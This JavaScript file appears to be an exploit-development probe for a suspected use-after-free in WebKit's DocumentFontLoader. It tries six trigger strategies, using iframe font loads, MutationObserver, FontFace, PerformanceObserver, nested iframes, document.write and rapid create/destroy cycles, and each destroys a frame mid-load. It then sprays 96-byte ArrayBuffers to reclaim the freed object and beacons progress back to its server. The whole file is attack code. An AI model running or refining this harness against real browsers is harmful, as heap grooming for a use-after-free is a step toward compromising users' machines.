// p265 — DocumentFontLoader re-entrancy UAF via multiple trigger paths
//
// Targets the SPECIFIC vulnerable code in WebKit-1200 DocumentFontLoader.cpp:
//
//   fontLoadingTimerFired() {
//     loadPendingFonts();                            // line 97
//     m_document.cachedResourceLoader().loadDone();  // line 101  <-- dangling if freed before
//     if (m_document.frame())                        // line 105  <-- dangling ref read
//       m_document.frame()->loader().checkLoadComplete(); // line 106
//   }
//
// loadPendingFonts() captures cachedResourceLoader as a local ref:
//   auto& cachedResourceLoader = m_document.cachedResourceLoader();
//   for (...) {
//     fontHandle->beginLoadIfNeeded(cachedResourceLoader);  // may trigger callbacks
//     cachedResourceLoader.decrementRequestCount();         // UAF if document freed above
//   }
//
// We test 3 escalation strategies:
//   G: MutationObserver triggers during DOM changes from font load
//   H: Multiple remote fonts with onload handler on each
//   I: Performance observer + iframe destruction during resource timing
//   J: Nested iframes with cascading font loads and destruction
//
// Beacon prefix: V265-
// DocumentFontLoader: FastMalloc, ~96 bytes (8 + ~64 + 24 + 2 + padding)

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V265-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function BA(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V265-' + tag + '?t=' + Date.now(), false);
      x.send(body || '');
    } catch (e) {}
  }

  BS('BOOT');

  // Spray helper: allocate objects matching DocumentFontLoader size (~96 bytes)
  function sprayFontLoader(count) {
    var spray = [];
    for (var i = 0; i < count; i++) {
      // 96-byte ArrayBuffer to match DocumentFontLoader allocation
      var ab = new ArrayBuffer(96);
      var u32 = new Uint32Array(ab);
      // Fill with marker pattern
      u32[0] = 0xDEAD0000 | (i & 0xFFFF);
      u32[1] = 0x41414141;
      u32[2] = 0x42424242;
      // Fill remaining with recognizable pattern
      for (var j = 3; j < 24; j++) {
        u32[j] = 0xCC000000 | (i << 8) | j;
      }
      spray.push(ab);
    }
    return spray;
  }

  // ========== Test G: MutationObserver during iframe font load ==========
  function testG() {
    BS('G-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      iframe.onload = function() {
        try {
          var idoc = iframe.contentDocument;
          if (!idoc) { BS('G-NODOC'); return; }

          // Set up MutationObserver on iframe DOM BEFORE font load
          var observer = new MutationObserver(function(mutations) {
            try {
              BS('G-MUTATION-FIRED');
              // During mutation callback, remove the iframe
              if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
                BS('G-IFRAME-REMOVED');
                // Spray immediately to reclaim DocumentFontLoader memory
                var spray = sprayFontLoader(500);
                BS('G-SPRAYED-' + spray.length);
              }
            } catch (e) {
              BA('G-MUTATION-ERR', e.message);
            }
          });

          observer.observe(idoc.documentElement, {
            childList: true, subtree: true, attributes: true
          });

          // Inject font-face CSS that triggers font loading
          var style = idoc.createElement('style');
          style.textContent = '@font-face { font-family: "TestG"; src: local("Helvetica"), local("Arial"); } body { font-family: "TestG"; }';
          idoc.head.appendChild(style);

          // Force layout to trigger font load
          var div = idoc.createElement('div');
          div.textContent = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
          div.style.fontFamily = 'TestG';
          idoc.body.appendChild(div);

          // Read computed style to force font resolution
          var w = div.offsetWidth;
          BS('G-LAYOUT-W-' + w);

          setTimeout(function() {
            BS('G-TIMEOUT');
            if (iframe.parentNode) {
              BS('G-STILL-ATTACHED');
            } else {
              BS('G-DETACHED-OK');
            }
          }, 500);
        } catch (e) {
          BA('G-ERR', e.message);
        }
      };

      document.body.appendChild(iframe);
      // Use srcdoc for same-origin iframe
      iframe.srcdoc = '<!doctype html><html><head></head><body></body></html>';
    } catch (e) {
      BA('G-OUTER-ERR', e.message);
    }
  }

  // ========== Test H: FontFace API load() with iframe destruction ==========
  function testH() {
    BS('H-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      iframe.onload = function() {
        try {
          var idoc = iframe.contentDocument;
          var iwin = iframe.contentWindow;
          if (!idoc || !iwin) { BS('H-NODOC'); return; }

          // Create multiple @font-face declarations to queue multiple loads
          var style = idoc.createElement('style');
          var css = '';
          for (var i = 0; i < 8; i++) {
            css += '@font-face { font-family: "TH' + i + '"; src: local("Helvetica"), local("Arial"); }\n';
          }
          style.textContent = css;
          idoc.head.appendChild(style);

          // Use FontFace API to trigger loads
          var faces = [];
          for (var i = 0; i < 8; i++) {
            try {
              var f = new iwin.FontFace('TH' + i, 'local("Helvetica"), local("Arial")');
              idoc.fonts.add(f);
              faces.push(f);
            } catch (e) {}
          }
          BS('H-FACES-' + faces.length);

          // Start loading all faces
          var loadPromises = [];
          for (var i = 0; i < faces.length; i++) {
            loadPromises.push(faces[i].load());
          }

          // When first font loads, destroy the iframe
          Promise.race(loadPromises).then(function() {
            BS('H-FIRST-LOADED');
            if (iframe.parentNode) {
              iframe.parentNode.removeChild(iframe);
              BS('H-REMOVED');
              // Spray to reclaim
              var spray = sprayFontLoader(500);
              BS('H-SPRAYED');
            }
          }).catch(function(e) {
            BA('H-LOAD-ERR', e.message);
          });

          // Also listen to document.fonts.ready
          idoc.fonts.ready.then(function() {
            BS('H-FONTS-READY');
            // If iframe still exists, remove it now
            if (iframe.parentNode) {
              iframe.parentNode.removeChild(iframe);
              BS('H-READY-REMOVED');
              var spray = sprayFontLoader(500);
              BS('H-READY-SPRAYED');
            }
          });

          setTimeout(function() {
            BS('H-TIMEOUT');
          }, 1000);
        } catch (e) {
          BA('H-ERR', e.message);
        }
      };

      document.body.appendChild(iframe);
      iframe.srcdoc = '<!doctype html><html><head></head><body>font test</body></html>';
    } catch (e) {
      BA('H-OUTER-ERR', e.message);
    }
  }

  // ========== Test I: PerformanceObserver + font resource timing ==========
  function testI() {
    BS('I-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      iframe.onload = function() {
        try {
          var idoc = iframe.contentDocument;
          var iwin = iframe.contentWindow;
          if (!idoc || !iwin) { BS('I-NODOC'); return; }

          // Watch for resource timing entries (font loads)
          if (iwin.PerformanceObserver) {
            var po = new iwin.PerformanceObserver(function(list) {
              var entries = list.getEntries();
              BS('I-PERF-' + entries.length);
              for (var i = 0; i < entries.length; i++) {
                if (entries[i].initiatorType === 'css') {
                  BS('I-FONT-RESOURCE');
                  // Destroy iframe during font resource callback
                  if (iframe.parentNode) {
                    iframe.parentNode.removeChild(iframe);
                    BS('I-DESTROYED');
                    var spray = sprayFontLoader(500);
                    BS('I-SPRAYED');
                  }
                }
              }
            });
            po.observe({ entryTypes: ['resource'] });
            BS('I-OBSERVER-SET');
          } else {
            BS('I-NO-PERF-API');
          }

          // Load a font that triggers resource timing
          var style = idoc.createElement('style');
          style.textContent = '@font-face { font-family: "TI"; src: local("Helvetica"), local("Arial"); } body { font-family: "TI"; }';
          idoc.head.appendChild(style);
          var div = idoc.createElement('div');
          div.textContent = 'TEST';
          div.style.fontFamily = 'TI';
          idoc.body.appendChild(div);
          void div.offsetWidth;

          setTimeout(function() {
            BS('I-TIMEOUT');
          }, 1000);
        } catch (e) {
          BA('I-ERR', e.message);
        }
      };

      document.body.appendChild(iframe);
      iframe.srcdoc = '<!doctype html><html><head></head><body></body></html>';
    } catch (e) {
      BA('I-OUTER-ERR', e.message);
    }
  }

  // ========== Test J: Nested iframe cascade destruction ==========
  function testJ() {
    BS('J-START');
    try {
      // Create outer iframe
      var outer = document.createElement('iframe');
      outer.style.display = 'none';

      outer.onload = function() {
        try {
          var odoc = outer.contentDocument;
          if (!odoc) { BS('J-NODOC'); return; }

          // In outer iframe, create inner iframe with font load
          var inner = odoc.createElement('iframe');
          inner.style.display = 'none';

          inner.onload = function() {
            try {
              var idoc = inner.contentDocument;
              var iwin = inner.contentWindow;
              if (!idoc) { BS('J-NO-INNER'); return; }

              // Set up font in inner iframe
              var style = idoc.createElement('style');
              style.textContent = '@font-face { font-family: "TJ"; src: local("Helvetica"), local("Arial"); } body { font-family: "TJ"; }';
              idoc.head.appendChild(style);

              // When inner iframe fires load (after fonts), destroy OUTER iframe
              // This cascades: outer destroyed -> inner destroyed -> both DocumentFontLoaders freed
              iwin.addEventListener('load', function() {
                BS('J-INNER-LOAD');
              });

              var div = idoc.createElement('div');
              div.textContent = 'CASCADE';
              div.style.fontFamily = 'TJ';
              idoc.body.appendChild(div);
              void div.offsetWidth;
              BS('J-INNER-LAYOUT');
            } catch (e) {
              BA('J-INNER-ERR', e.message);
            }
          };

          // Also set up font in outer iframe
          var ostyle = odoc.createElement('style');
          ostyle.textContent = '@font-face { font-family: "TJO"; src: local("Helvetica"), local("Arial"); } body { font-family: "TJO"; }';
          odoc.head.appendChild(ostyle);

          // Listen for outer load event to destroy OUTER from parent
          odoc.defaultView.addEventListener('load', function() {
            BS('J-OUTER-LOAD');
            // Destroy the outer iframe from the parent
            setTimeout(function() {
              if (outer.parentNode) {
                outer.parentNode.removeChild(outer);
                BS('J-CASCADE-DESTROY');
                var spray = sprayFontLoader(1000);
                BS('J-SPRAYED-' + spray.length);
              }
            }, 0);
          });

          odoc.body.appendChild(inner);
          inner.srcdoc = '<!doctype html><html><head></head><body></body></html>';

          var odiv = odoc.createElement('div');
          odiv.textContent = 'OUTER';
          odiv.style.fontFamily = 'TJO';
          odoc.body.appendChild(odiv);
          void odiv.offsetWidth;
          BS('J-OUTER-LAYOUT');
        } catch (e) {
          BA('J-ERR', e.message);
        }
      };

      document.body.appendChild(outer);
      outer.srcdoc = '<!doctype html><html><head></head><body></body></html>';
    } catch (e) {
      BA('J-OUTER-ERR', e.message);
    }
  }

  // ========== Test K: document.write font load + synchronous destruction ==========
  function testK() {
    BS('K-START');
    try {
      // Create iframe and use document.write to inject font CSS
      // document.write is synchronous and can trigger font loading during parsing
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      var idoc = iframe.contentDocument;
      idoc.open();
      idoc.write('<!doctype html><html><head>');
      idoc.write('<style>@font-face { font-family: "TK"; src: local("Helvetica"), local("Arial"); }');
      idoc.write('body { font-family: "TK"; }</style>');
      idoc.write('</head><body>');
      // Write content that needs font
      idoc.write('<div style="font-family:TK">ABCDEFGHIJKLMNOPQRSTUVWXYZ</div>');
      // Write script that self-destructs on load
      idoc.write('<script>window.addEventListener("load", function() {');
      idoc.write('  try {');
      idoc.write('    var fe = window.frameElement;');
      idoc.write('    if (fe && fe.parentNode) {');
      idoc.write('      fe.parentNode.removeChild(fe);');
      idoc.write('    }');
      idoc.write('  } catch(e) {}');
      idoc.write('});<\/script>');
      idoc.write('</body></html>');
      idoc.close();
      BS('K-DOC-WRITTEN');

      // Spray after a short delay (iframe may have self-destructed)
      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('K-SELF-DESTRUCTED');
          var spray = sprayFontLoader(500);
          BS('K-SPRAYED');
        } else {
          BS('K-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 200);
    } catch (e) {
      BA('K-ERR', e.message);
    }
  }

  // ========== Test L: Rapid create/destroy cycle with font load timing ==========
  function testL() {
    BS('L-START');
    var destroyed = 0;
    var created = 0;

    function cycle() {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      iframe.onload = function() {
        try {
          var idoc = iframe.contentDocument;
          if (!idoc) return;

          var style = idoc.createElement('style');
          style.textContent = '@font-face { font-family: "TL' + created + '"; src: local("Helvetica"), local("Arial"); } body { font-family: "TL' + created + '"; }';
          idoc.head.appendChild(style);

          var div = idoc.createElement('div');
          div.textContent = 'RAPID';
          div.style.fontFamily = 'TL' + created;
          idoc.body.appendChild(div);
          void div.offsetWidth;

          // Destroy IMMEDIATELY after layout forces font load
          // The fontLoadingTimer fires at 0ms delay — try to race it
          if (iframe.parentNode) {
            iframe.parentNode.removeChild(iframe);
            destroyed++;
          }
        } catch (e) {}
      };

      document.body.appendChild(iframe);
      iframe.srcdoc = '<!doctype html><html><head></head><body></body></html>';
      created++;
    }

    // Rapid fire: create and destroy 20 iframes
    for (var i = 0; i < 20; i++) {
      cycle();
    }

    setTimeout(function() {
      BS('L-CREATED-' + created + '-DESTROYED-' + destroyed);
      // Spray to reclaim any freed DocumentFontLoaders
      var spray = sprayFontLoader(2000);
      BS('L-SPRAYED-' + spray.length);
    }, 500);
  }

  // Run tests with delays to avoid interference
  testG();
  setTimeout(testH, 2000);
  setTimeout(testI, 5000);
  setTimeout(testJ, 8000);
  setTimeout(testK, 12000);
  setTimeout(testL, 15000);
  setTimeout(function() { BS('ALL-DONE'); }, 20000);

})();
